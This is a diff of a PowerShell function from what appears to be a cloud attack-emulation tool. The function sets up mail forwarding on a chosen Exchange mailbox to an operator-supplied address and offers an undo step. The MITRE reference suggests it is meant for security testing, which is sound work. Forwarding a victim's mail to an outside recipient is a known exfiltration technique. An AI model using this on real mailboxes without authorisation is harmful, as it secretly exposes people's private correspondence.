@@ -2,43 +2,65 @@ function MailForwarding {
     mitre_details("MailForwarding")
 
     #Get target mailbox
-    EnterMailbox("Enter a mailbox address to setup mail forwarding from")
+    EnterMailbox("`n[?] Enter mailbox address to setup mail forwarding from")
+
     $target_mailbox = $global:mailbox_address
 
-    #Enter destination mailbox address
-    $ExternalAccount = Read-Host -Prompt "`nEnter a target email to forward the mailbox to"
+    MAADWriteProcess "Fetching current forwarding configuration of mailbox"
+    $mailbox_config = Get-Mailbox -Identity $target_mailbox
+    #$mailbox_config | Format-Table @{Label="Name";Expression={$_.DisplayName}}, @{Label="Forwarding Address";Expression={$_.ForwardingSMTPAddress}}, AuditEnabled
+    if ($mailbox_config.ForwardingSMTPAddress -eq $null){
+        MAADWriteProcess "Current Forwarding Address : None"
+    }
+    else{
+        MAADWriteProcess "Current Forwarding Address : $($mailbox_config.ForwardingSMTPAddress)"
+    }
+    MAADWriteProcess "Current Audit Enabled : $($mailbox_config.AuditEnabled)"
 
-    #Get-Mailbox -Identity $InternalUserName
-    Write-Host "`nDisplaying existing forwarding address of mailbox $target_mailbox , if any ..." -ForegroundColor Gray
-    Get-Mailbox -Identity $target_mailbox | Format-Table -Property ForwardingSMTPAddress
+    #Enter destination mailbox address
+    $recipient_mailbox = Read-Host -Prompt "`n[?] Enter email address to forward mailbox to"
+    Write-Host ""
 
     #Setup mailbox forwarding
     try {
-        Write-Host "`nSetting up mail forwarding to target email address..." -ForegroundColor Gray
-        Set-Mailbox -Identity $target_mailbox -DeliverToMailboxAndForward $true -ForwardingSMTPAddress $ExternalAccount -ErrorAction Stop
-        Start-Sleep -s 10
-        Get-Mailbox -Identity $target_mailbox | Format-Table -Property ForwardingSMTPAddress
-        Write-Host "`n[Success] Deployed mail forwarding on $target_mailbox" -ForegroundColor Yellow
+        MAADWriteProcess "Deploying mail forwarding"
+        MAADWriteProcess "Forwarding Config: Source($target_mailbox) -> Recipient($recipient_mailbox)"
+        Set-Mailbox -Identity $target_mailbox -DeliverToMailboxAndForward $true -ForwardingSMTPAddress $recipient_mailbox -ErrorAction Stop | Out-Null
+        MAADWriteProcess "Deployed mail forwarding"
+        MAADWriteProcess "Fetching updated forwarding configuration of mailbox"
+        Start-Sleep -s 30
+        $mailbox_config_updated = Get-Mailbox -Identity $target_mailbox
+        #Get-Mailbox -Identity $target_mailbox | Format-Table @{Label="Name";Expression={$_.DisplayName}}, @{Label="Forwarding Address";Expression={$_.ForwardingSMTPAddress}}, AuditEnabled
+        MAADWriteProcess "Updated Forwarding Address : $($mailbox_config_updated.ForwardingSMTPAddress)"
+        MAADWriteSuccess "Deployed Mail Forwarding"
         $allow_undo = $true
     }
     catch {
-        Write-Host "`n[Error] Failed to setup mail forwarding on mailbox $target_mailbox" -ForegroundColor Red
+        MAADWriteError "Failed to deploy mail forwarding"
     }
     
     #Undo changes
     if ($allow_undo -eq $true) {
-        $user_confirm = Read-Host -Prompt "`nWould you like to undo modifications and remove mailbox forwarding (yes/no)"
+        $user_confirm = Read-Host -Prompt "`n[?] Undo: Remove mail forwarding config from mailbox (y/n)"
+        Write-Host ""
         if ($user_confirm -notin "No","no","N","n") {
-            try {
-                Write-Host "`nRemoving mail forwarding from mailbox: $target_mailbox ..." -ForegroundColor Gray
+            try {   
+                MAADWriteProcess "Removing mail forwarding from mailbox -> $target_mailbox"
                 Set-Mailbox -Identity $target_mailbox -ForwardingSMTPAddress $null
-                Write-Host "`n[Undo Success] Removed mail forwarding from mailbox" -ForegroundColor Yellow
+                MAADWriteProcess "Fetching updated forwarding configuration of mailbox"
+                Start-Sleep -s 30
+                $mailbox_config_updated = Get-Mailbox -Identity $target_mailbox
+                if ($mailbox_config_updated.ForwardingSMTPAddress -eq $null){
+                    MAADWriteProcess "Updated Forwarding Address : None"
+                }
+                MAADWriteProcess "Updated Forwarding Address : $($mailbox_config_updated.ForwardingSMTPAddress)"
+                #Get-Mailbox -Identity $target_mailbox | Format-Table @{Label="Name";Expression={$_.DisplayName}}, @{Label="Forwarding Address";Expression={$_.ForwardingSMTPAddress}}, AuditEnabled
+                MAADWriteSuccess "Removed mail forwarding configuration"
             }
             catch {
-                Write-Host "`n[Undo Error] Failed to remove mail forwarding from mailbox" -ForegroundColor Red
+                MAADWriteError "Failed to remove mail forwarding configuration"
             }
-            
         }
     }
-    Pause    
+    MAADPause    
 }
